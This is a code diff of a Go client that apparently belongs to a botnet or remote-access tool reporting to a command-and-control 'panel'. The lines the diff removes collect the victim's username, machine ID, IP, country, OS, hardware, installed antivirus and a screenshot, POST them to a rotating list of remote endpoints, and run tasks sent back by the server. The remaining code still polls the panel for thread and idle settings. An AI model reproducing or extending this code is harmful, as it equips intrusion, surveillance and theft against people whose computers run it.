@@ -1,10 +1,10 @@
-//go:build panel
+//go:build !panel
 
 // core.go
+
 package main
 
 import (
-	"bytes"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -14,6 +14,7 @@ import (
 )
 
 func getDomain() string {
+	fmt.Println("sending GET request")
 
 	endpointList := strings.Split(endpoints, ",")
 	fmt.Println(endpointList)
@@ -21,7 +22,6 @@ func getDomain() string {
 	client := &http.Client{
 		Timeout: 5 * time.Second, // Adjust timeout as needed
 	}
-
 	var livedomain = ""
 
 	// Iterate through the list of domains
@@ -93,29 +93,13 @@ func runChecks() {
 
 func getConfig() {
 	for {
-		fmt.Println("panel request")
-		jsonData := map[string]string{
-			"pcname":     GetUsername() + "-" + getSystemUUID(),
-			"ip":         GetClientIP(),
-			"nation":     getNation(),
-			"os":         getWindowsVersion(),
-			"cpu":        getCPUName(),
-			"gpu":        getGPUName(),
-			"antivirus":  getActiveAntivirus(),
-			"screenshot": string(takeScreenshot()),
-		}
-
-		jsonBytes, err := json.Marshal(jsonData)
-		if err != nil {
-			fmt.Println("Error marshalling JSON:", err)
-			continue
-		}
 
 		var data []Res
 		//success := false
 		endpoint := getDomain()
+		fmt.Println("hello?")
 
-		resp, err := http.Post(endpoint, "application/json", bytes.NewReader(jsonBytes))
+		resp, err := http.Get(endpoint)
 		if err != nil {
 			fmt.Println("Request failed:", err)
 			continue
@@ -127,6 +111,8 @@ func getConfig() {
 			fmt.Println("Failed to read response:", err)
 			continue
 		}
+
+		fmt.Println(string(bodyBytes))
 
 		if err := json.Unmarshal(bodyBytes, &data); err != nil {
 			fmt.Println("Failed to parse JSON:", err)
@@ -143,6 +129,7 @@ func getConfig() {
 		// 	time.Sleep(10 * time.Second)
 		// 	continue
 		// }
+
 		fmt.Println("working?")
 		fmt.Println(data)
 
@@ -153,9 +140,6 @@ func getConfig() {
 		idle_time = data[0].IdleTime
 		idlethreads = data[0].IdleThreads
 		ssl = data[0].Ssl
-
-		fmt.Println("Task:", data[0].Task)
-		go HandleTask(data[0].Task)
 
 		time.Sleep(25 * time.Second)
 	}
